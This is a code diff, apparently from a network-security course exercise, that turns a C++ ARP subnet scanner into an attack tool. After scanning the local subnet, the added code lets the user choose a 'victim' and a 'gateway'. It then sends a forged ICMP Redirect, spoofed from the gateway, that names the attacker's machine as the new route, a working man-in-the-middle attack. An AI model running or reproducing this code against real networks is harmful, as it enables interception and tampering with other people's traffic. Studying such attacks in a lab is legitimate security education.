@@ -1,190 +1,264 @@
 #include <iostream>
-#include <iomanip>
+#include <vector>
+#include <string>
 #include <cstring>
-#include <unistd.h>
-
+#include <thread>
+#include <chrono>
+#include <iomanip>
 #include <sys/socket.h>
 #include <sys/ioctl.h>
 #include <arpa/inet.h>
 #include <net/if.h>
-#include <net/ethernet.h>
 #include <netinet/if_ether.h>
-#include <netinet/in.h>
+#include <netinet/ip.h>
+#include <netinet/ip_icmp.h>
 #include <linux/if_packet.h>
-#include <linux/if_ether.h>
+#include <unistd.h>
+#include <ifaddrs.h>
 
 using namespace std;
 
 struct Device {
-    struct in_addr ip;
-    uint8_t        mac[6];
+    string ip;
+    string mac;
 };
 
-struct ArpPacket {
-    struct ethhdr     eth;
-    struct ether_arp  arp;
-};
+uint8_t self_mac[6];
+struct in_addr self_ip;
+int ifindex;
 
 
-// Retrieve the MAC address for a given interface via an existing socket fd.
-static bool get_iface_mac(int sockfd, const char *iface, uint8_t mac[6])
-{
-    struct ifreq ifr{};
-    strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);
-
-    if (ioctl(sockfd, SIOCGIFHWADDR, &ifr) < 0) {
-        perror("ioctl(SIOCGIFHWADDR)");
-        return false;
+// 計算 Checksum (fixed: proper one's complement fold)
+unsigned short calculate_checksum(unsigned short *ptr, int nbytes) {
+    unsigned long sum = 0;
+    for (; nbytes > 1; nbytes -= 2) {
+        sum += *ptr++;
     }
+    if (nbytes == 1) {
+        sum += *(unsigned char*)ptr;
+    }
+    // FIX: was "sum += (sum >> 16) + (sum & 0xffff);" which double-counts.
+    // Correct two-step fold:
+    sum = (sum >> 16) + (sum & 0xffff);
+    sum += (sum >> 16);
+    return (unsigned short)(~sum);
+}
 
+unsigned short calculate_checksum_safe(const void* data, int nbytes) {
+    // Copy to aligned buffer first
+    vector<uint8_t> buf(nbytes + 1, 0);
+    memcpy(buf.data(), data, nbytes);
+    return calculate_checksum((unsigned short*)buf.data(), nbytes);
+}
+
+// 取得本機 MAC 與 IP 資訊
+bool get_local_info(const string& iface_name, uint8_t* mac, struct in_addr* ip, int* ifindex) {
+    int sock = socket(AF_INET, SOCK_DGRAM, 0);
+    struct ifreq ifr;
+    strncpy(ifr.ifr_name, iface_name.c_str(), IFNAMSIZ);
+
+    if (ioctl(sock, SIOCGIFHWADDR, &ifr) < 0) return false;
     memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);
+
+    if (ioctl(sock, SIOCGIFADDR, &ifr) < 0) return false;
+    *ip = ((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr;
+
+    if (ioctl(sock, SIOCGIFINDEX, &ifr) < 0) return false;
+    *ifindex = ifr.ifr_ifindex;
+
+    close(sock);
     return true;
 }
 
-// Retrieve the interface index via an existing socket fd.
-// Returns -1 on failure.
-static int get_iface_index(int sockfd, const char *iface)
-{
-    struct ifreq ifr{};
-    strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);
+// 執行 ARP 掃描 (Task I)
+vector<Device> scan_devices(const string& iface_name) {
 
-    if (ioctl(sockfd, SIOCGIFINDEX, &ifr) < 0) {
-        perror("ioctl(SIOCGIFINDEX)");
-        return -1;
+    int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
+
+    // 設定接收超時 (2秒)
+    struct timeval tv;
+    tv.tv_sec = 2; tv.tv_usec = 0;
+    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv, sizeof tv);
+
+    string base_ip = inet_ntoa(self_ip);
+    base_ip = base_ip.substr(0, base_ip.find_last_of('.') + 1);
+
+    // 1. 迸發發送 ARP Request
+    for (int i = 1; i < 255; i++) {
+        string target_ip_str = base_ip + to_string(i);
+        if (target_ip_str == inet_ntoa(self_ip)) continue;
+
+        struct {
+            struct ethhdr eth;
+            struct ether_arp arp;
+        } frame;
+
+        memset(&frame, 0, sizeof(frame));
+        memset(frame.eth.h_dest, 0xff, 6); // Broadcast
+        memcpy(frame.eth.h_source, self_mac, 6);
+        frame.eth.h_proto = htons(ETH_P_ARP);
+
+        frame.arp.ea_hdr.ar_hrd = htons(ARPHRD_ETHER);
+        frame.arp.ea_hdr.ar_pro = htons(ETH_P_IP);
+        frame.arp.ea_hdr.ar_hln = 6;
+        frame.arp.ea_hdr.ar_pln = 4;
+        frame.arp.ea_hdr.ar_op = htons(ARPOP_REQUEST);
+
+        memcpy(frame.arp.arp_sha, self_mac, 6);
+        memcpy(frame.arp.arp_spa, &self_ip, 4);
+        struct in_addr tip;
+        inet_aton(target_ip_str.c_str(), &tip);
+        memcpy(frame.arp.arp_tpa, &tip, 4);
+
+        struct sockaddr_ll saddr_ll = {0};
+        saddr_ll.sll_ifindex = ifindex;
+        saddr_ll.sll_halen = ETH_ALEN;
+        memcpy(saddr_ll.sll_addr, frame.eth.h_dest, 6);
+
+        sendto(sock, &frame, sizeof(frame), 0, (struct sockaddr*)&saddr_ll, sizeof(saddr_ll));
     }
 
-    return ifr.ifr_ifindex;
-}
+    // 2. 接收 ARP Reply
+    vector<Device> found;
+    uint8_t buffer[1024];
+    while (recv(sock, buffer, sizeof(buffer), 0) > 0) {
+        struct ether_arp* arp_resp = (struct ether_arp*)(buffer + 14);
+        if (ntohs(arp_resp->ea_hdr.ar_op) == ARPOP_REPLY) {
+            char ip_buf[INET_ADDRSTRLEN];
+            inet_ntop(AF_INET, arp_resp->arp_spa, ip_buf, INET_ADDRSTRLEN);
 
-static void print_mac(const uint8_t mac[6])
-{
-    for (int i = 0; i < 6; ++i) {
-        if (i) cout << ':';
-        cout << hex << setw(2) << setfill('0') << (int)mac[i];
-    }
-    cout << dec;
-}
+            char mac_buf[18];
+            sprintf(mac_buf, "%02x:%02x:%02x:%02x:%02x:%02x",
+                    arp_resp->arp_sha[0], arp_resp->arp_sha[1], arp_resp->arp_sha[2],
+                    arp_resp->arp_sha[3], arp_resp->arp_sha[4], arp_resp->arp_sha[5]);
 
-// == Main Program ==
-int main(int argc, char *argv[])
-{
-    if (argc < 3) {
-        cerr << "Usage: sudo " << argv[0] << " <self_ip> <interface>\n";
-        return 1;
-    }
-
-    const char *self_ip_str = argv[1];
-    const char *iface       = argv[2];
-
-    // Parse self IP and derive /24 subnet base
-    uint32_t ip_net    = inet_addr(self_ip_str);          // network byte order
-    uint32_t ip_host   = ntohl(ip_net);                   // host byte order
-    uint32_t subnet    = ip_host & 0xFFFFFF00u;
-
-    // Open raw ARP socket 
-    int sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
-    if (sockfd < 0) {
-        perror("socket() — try running with sudo");
-        return 1;
-    }
-
-    //  Resolve interface info (reuse sockfd — no temp socket needed) 
-    uint8_t self_mac[6];
-    if (!get_iface_mac(sockfd, iface, self_mac)) {
-        cerr << "Failed to get MAC for interface: " << iface << '\n';
-        close(sockfd);
-        return 1;
-    }
-
-    int if_index = get_iface_index(sockfd, iface);
-    if (if_index < 0) {
-        cerr << "Failed to get index for interface: " << iface << '\n';
-        close(sockfd);
-        return 1;
-    }
-
-    //  Receive timeout so we don't block forever 
-    struct timeval tv{ .tv_sec = 2, .tv_usec = 0 };
-    setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof tv);
-
-    //  Build the ARP request template 
-    ArpPacket req{};
-
-    // Ethernet header
-    memset(req.eth.h_dest,   0xff,      6);
-    memcpy(req.eth.h_source, self_mac,  6);
-    req.eth.h_proto = htons(ETH_P_ARP);
-
-    // ARP header (fields that never change across the sweep)
-    req.arp.arp_hrd = htons(ARPHRD_ETHER);
-    req.arp.arp_pro = htons(ETH_P_IP);
-    req.arp.arp_hln = 6;
-    req.arp.arp_pln = 4;
-    req.arp.arp_op  = htons(ARPOP_REQUEST);
-    memcpy(req.arp.arp_sha, self_mac, 6);
-    memcpy(req.arp.arp_spa, &ip_net,  4);
-    memset(req.arp.arp_tha, 0x00,     6);
-
-    // Destination address for sendto()
-    struct sockaddr_ll dest{};
-    dest.sll_family  = AF_PACKET;
-    dest.sll_ifindex = if_index;
-    dest.sll_halen   = 6;
-    memset(dest.sll_addr, 0xff, 6);
-
-    for (int i = 1; i < 255; ++i) {
-        uint32_t target = htonl(subnet | (uint32_t)i);
-        memcpy(req.arp.arp_tpa, &target, 4);
-        sendto(sockfd, &req, sizeof req, 0,
-               reinterpret_cast<sockaddr*>(&dest), sizeof dest);
-    }
-
-    //  Collect replies 
-    static Device devices[256];
-    int           device_count = 0;
-
-    ArpPacket resp;
-    while (recv(sockfd, &resp, sizeof resp, 0) > 0) {
-
-        if (ntohs(resp.eth.h_proto) != ETH_P_ARP  ||
-            ntohs(resp.arp.arp_op)  != ARPOP_REPLY)
-            continue;
-
-        struct in_addr sender_ip;
-        memcpy(&sender_ip, resp.arp.arp_spa, 4);
-
-        // Skip ourselves
-        if (sender_ip.s_addr == ip_net) continue;
-
-        // Skip duplicates
-        bool exists = false;
-        for (int j = 0; j < device_count; ++j) {
-            if (devices[j].ip.s_addr == sender_ip.s_addr) { exists = true; break; }
+            found.push_back({ip_buf, mac_buf});
         }
-        if (exists || device_count >= 256) continue;
+    }
+    close(sock);
+    return found;
+}
 
-        devices[device_count].ip = sender_ip;
-        memcpy(devices[device_count].mac, resp.arp.arp_sha, 6);
-        ++device_count;
+void send_redirect(const string& victim_ip, const string& gateway_ip, const string& attacker_ip, const string& destination) {
+    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+    int one = 1;
+    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
+        perror("setsockopt failed!!!");
+        return;
     }
 
-    close(sockfd);
+    // --- Build the ICMP Redirect packet with correct paddings and checksums ---
+    struct __attribute__((packed)) ICMP_Echo_Reply {
+        uint8_t type;      // 0
+        uint8_t code;      // 0
+        uint16_t checksum;
+        uint16_t id;
+        uint16_t seq;
+    };
 
-    // ── Print results ────────────────────────────────────────────────────────
-    const char *line = "--------------------------------------------";
-    cout << '\n' << line << '\n'
-        << left << setw(8) << "Index" << right << "| "
-        << left << setw(15) << "IP" << right << "| "
-        << left << setw(17) << "MAC" << right << '\n'
-        << line << '\n';
+    struct __attribute__((packed)) RedirectPacket {
+        struct iphdr ip;         // Outer IP header
+        struct icmphdr icmp;     // ICMP Redirect header
+        struct iphdr inner_ip;   // Embedded IP header
+        ICMP_Echo_Reply echo;    // Embedded ICMP Echo Reply
+    } packet;
 
-    for (int i = 0; i < device_count; ++i) {
-        cout << i << "       | "
-            << left << setw(15) << inet_ntoa(devices[i].ip) << right << "| ";
-        print_mac(devices[i].mac);
-        cout << '\n';
+    memset(&packet, 0, sizeof(packet));
+
+    // Outer IP Header
+    packet.ip.version = 4;
+    packet.ip.ihl = 5;
+    packet.ip.tos = 0;
+    packet.ip.tot_len = htons(sizeof(packet));
+    packet.ip.id = htons(12345);
+    packet.ip.frag_off = 0;
+    packet.ip.ttl = 64;
+    packet.ip.protocol = IPPROTO_ICMP;
+    packet.ip.check = 0;
+    packet.ip.saddr = inet_addr(gateway_ip.c_str());
+    packet.ip.daddr = inet_addr(victim_ip.c_str());
+    // Calculate outer IP checksum
+    packet.ip.check = calculate_checksum_safe(&packet.ip, sizeof(struct iphdr));
+
+    // ICMP Redirect Header
+    packet.icmp.type = 5;   // Redirect
+    packet.icmp.code = 1;   // Host
+    packet.icmp.checksum = 0;
+    packet.icmp.un.gateway = inet_addr(attacker_ip.c_str());
+
+    // Embedded IP Header (original packet)
+    packet.inner_ip.version = 4;
+    packet.inner_ip.ihl = 5;
+    packet.inner_ip.tos = 0;
+    packet.inner_ip.tot_len = htons(sizeof(struct iphdr) + sizeof(ICMP_Echo_Reply));
+    packet.inner_ip.id = htons(22486);
+    packet.inner_ip.frag_off = 0;
+    packet.inner_ip.ttl = 64;
+    packet.inner_ip.protocol = IPPROTO_ICMP;
+    packet.inner_ip.check = 0;
+    packet.inner_ip.saddr = inet_addr(victim_ip.c_str());
+    packet.inner_ip.daddr = inet_addr(destination.c_str());
+    // Calculate inner IP checksum
+    packet.inner_ip.check = calculate_checksum_safe(&packet.inner_ip, sizeof(struct iphdr));
+
+    // Embedded ICMP Echo Reply
+    packet.echo.type = 0; // Echo Reply
+    packet.echo.code = 0;
+    packet.echo.checksum = 0;
+    packet.echo.id = 0;
+    packet.echo.seq = 0;
+    // Calculate checksum for embedded ICMP Echo Reply
+    packet.echo.checksum = calculate_checksum_safe(&packet.echo, sizeof(ICMP_Echo_Reply));
+
+    // Calculate ICMP Redirect checksum (header + embedded IP + embedded ICMP)
+    // FIX: icmp_payload_len must include sizeof(struct icmphdr) as part of total,
+    // and the checksum region starts at &packet.icmp and spans the full ICMP block.
+    int icmp_total_len = sizeof(struct icmphdr) + sizeof(struct iphdr) + sizeof(ICMP_Echo_Reply);
+    packet.icmp.checksum = calculate_checksum_safe(&packet.icmp, icmp_total_len);
+
+    int packet_len = sizeof(packet);
+
+    struct sockaddr_in dest;
+    dest.sin_family = AF_INET;
+    dest.sin_addr.s_addr = packet.ip.daddr;
+
+    if (sendto(sock, &packet, packet_len, 0, (struct sockaddr*)&dest, sizeof(dest)) < 0) {
+        perror("sendto failed!!!");
+    } else {
+        cout << "ICMP Redirect packet sent to " << victim_ip << " successfully !" << endl;
     }
 
-    cout << line << '\n';
+    close(sock);
+    return;
+}
+
+int main(int argc, char* argv[]) {
+    if (geteuid() != 0) {
+        cerr << "Please run as root (sudo)." << endl;
+        return 1;
+    }
+
+    string destination = argv[1];
+    string iface = argv[2];
+
+    if (!get_local_info(iface, self_mac, &self_ip, &ifindex)) return 0;
+
+    vector<Device> devices = scan_devices(iface);
+    string LINE = "---------------------------------------------";
+    cout << LINE << endl;
+    cout << left << setw(5) << "Index |" << setw(20) << "IP" << setw(20) << " | MAC" << endl;
+    cout << LINE << endl;
+    for (size_t i = 0; i < devices.size(); ++i) {
+        cout << left << setw(5) << i << setw(20) << devices[i].ip << setw(20) << devices[i].mac << endl;
+    }
+    cout << LINE << endl;
+    int v_idx, g_idx;
+    cout << "Select Victim IP Index: "; cin >> v_idx;
+    cout << "Select Gateway IP Index: "; cin >> g_idx;
+
+    cout << "Victim IP: " << devices[v_idx].ip << ", Gateway IP: " << devices[g_idx].ip << ", Attacker IP: " << inet_ntoa(self_ip) << endl;
+
+    send_redirect(devices[v_idx].ip, devices[g_idx].ip, inet_ntoa(self_ip), destination); // victim, gateway, attacker, destination
+
     return 0;
 }
